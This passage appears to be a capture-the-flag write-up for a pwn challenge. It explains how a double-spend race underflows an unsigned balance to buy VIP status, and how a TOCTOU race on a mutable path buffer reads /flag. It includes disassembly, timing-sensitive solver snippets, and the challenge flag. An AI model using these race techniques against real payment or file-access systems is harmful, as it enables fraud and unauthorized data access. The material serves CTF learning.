    "analysis": "# Apex Engine — Double-Spend Race + TOCTOU\n\n**Category:** Pwn  \n**Flag:** `hiCTF{t0ct0u_mult1thr34d_r4c3_c0nd1t10n_w1n_8d3f_c00fc583bc}`\n\n## Binary Analysis\n\nThe provided `challenge` is a stripped x86-64 ELF with PIE, NX, stack canary, and Full RELRO enabled.\n\nThe binary implements a multithreaded settlement engine. Users can submit asynchronous escrow transfers, inspect their balance, and upgrade to VIP for 10,000 credits. VIP unlocks a document enclave, but files containing `/flag` in their path remain restricted to Root Admin.\n\nThe exploit uses two independent race conditions. The first bypasses the balance check to obtain VIP. The second bypasses the enclave's file-access check.\n\n## 1. Settlement Race Condition\n\nThe account starts with 100 credits. Each transfer is processed asynchronously through a worker thread.\n\nThe settlement worker at PIE offset `0x1ef0` contains:\n\n```asm\n0x1efb  mov rcx, [rip+0x24de]  ; cash balance\n0x1f05  mov r8, [rdi+0x8]     ; transfer amount\n0x1f09  cmp rcx, r8\n0x1f0c  jb  insufficient\n0x1f15  mov edi, 0x61a8\n0x1f1a  call usleep\n0x1f2a  sub [rip+0x24af], rax\n0x1f32  add [rip+0x24af], rax\n```\n\nThe worker checks whether enough balance is available, sleeps for 25 ms, and then subtracts the amount. The check and subtraction are not protected by a mutex or a single atomic operation.\n\nThis allows multiple workers to pass the balance check using the same initial value.\n\nThe solver submits eight transfers of 100 credits in one write:\n\n```python\nio.send(b'2\\n100\\n' * 8)\n```\n\nSince all eight workers can observe the original balance before any debit occurs, they can collectively subtract 800 credits from an account containing only 100.\n\nThe balance is stored as an unsigned 64-bit integer:\n\n```text\n(100 - 800) mod 2^64\n= 18446744073709550916\n```\n\nLocal output:\n\n```text\n[+] Submitted: 0, 1, 2, 3, 4, 5, 6, 7\n[+] Cash=18446744073709550916, escrow=800\n[+] VIP upgraded\n```\n\nThe underflow produces enough credits to purchase VIP through menu option `4`.\n\nThis only unlocks the enclave. It does not grant Root Admin clearance.\n\n## 2. TOCTOU in the Document Enclave\n\nVIP users can initialize document slots, stream their contents, and edit their target paths.\n\nThe enclave streaming worker is located at PIE offset `0x1d80`.\n\n```asm\n0x1d8f  lea r12, [rdi+0x24]  ; slot path pointer\n0x1db1  call strstr           ; check for \"/flag\"\n0x1dbb  mov eax, [rip+0x2633] ; root clearance\n0x1dc3  je  deny\n0x1dc9  mov edi, 0x61a8       ; 25000 us\n0x1dd5  call usleep\n0x1ddd  mov rdi, r12\n0x1de0  call fopen\n```\n\nThe critical detail is that `strstr()` and `fopen()` use the same pointer to a mutable path buffer.\n\nThe program checks the path before opening it, but a different thread can modify that buffer during the 25 ms sleep.\n\nThe access check is therefore performed on one value, while the subsequent file operation can use another.\n\nThe attack sequence is:\n\n```text\nStreaming worker             Main thread\n----------------             -----------\ncheck /tmp/preview.txt\npath allowed\nsleep 25 ms                  edit slot 0 to /flag\nfopen(slot->path)\nread /flag\nwrite contents to stdout\n```\n\nSetting the restricted path before starting the worker triggers the expected security rejection. Updating it after the check but before `fopen()` bypasses that restriction.\n\nThe file is read using `fread()` with a maximum length of `0x1ff`, or 511 bytes per stream.\n\n## 3. Exploit Chain\n\nThe solver combines both primitives in a single session:\n\n1. Submit eight asynchronous transfers of 100 credits.\n2. Wait for settlement and verify the unsigned underflow.\n3. Upgrade the account to VIP.\n4. Enter the enclave and initialize slot `0` with `/tmp/preview.txt`.\n5. Dispatch a streaming worker.\n6. Wait briefly, then change the slot path to `/flag`.\n7. Extract the streamed file contents from stdout.\n\nThe timing-sensitive part of the solver is:\n\n```python\nio.send(b'2\\n0\\n')\n\ntime.sleep(0.008)\n\nio.send(b'3\\n0\\n/flag\\n')\n```\n\nThe stream command and edit command are sent without waiting for a response between them. Waiting for the streaming response would introduce network latency and could miss the 25 ms window.\n\nThe 8 ms delay worked in local testing. The solver exposes `--race-delay` and `--attempts` to handle timing differences between instances.\n\n## 4. Local Verification\n\nThe original archive does not contain `/flag`, so the local exploit was verified against a restricted test file.\n\nObserved output:\n\n```text\n[+] Cash=18446744073709550916, escrow=800\n[+] VIP upgraded\n[+] Slot 0 set to preview document\n[+] TOCTOU successful; file contents returned:\nAPEX_LOCAL_RACE_PROOF_dont_submit\n```\n\nThe marker above is test-file content, not the challenge flag.\n\nThe actual flag was subsequently obtained from the remote challenge and supplied by the player:\n\n```text\nhiCTF{t0ct0u_mult1thr34d_r4c3_c0nd1t10n_w1n_8d3f_c00fc583bc}\n```\n",
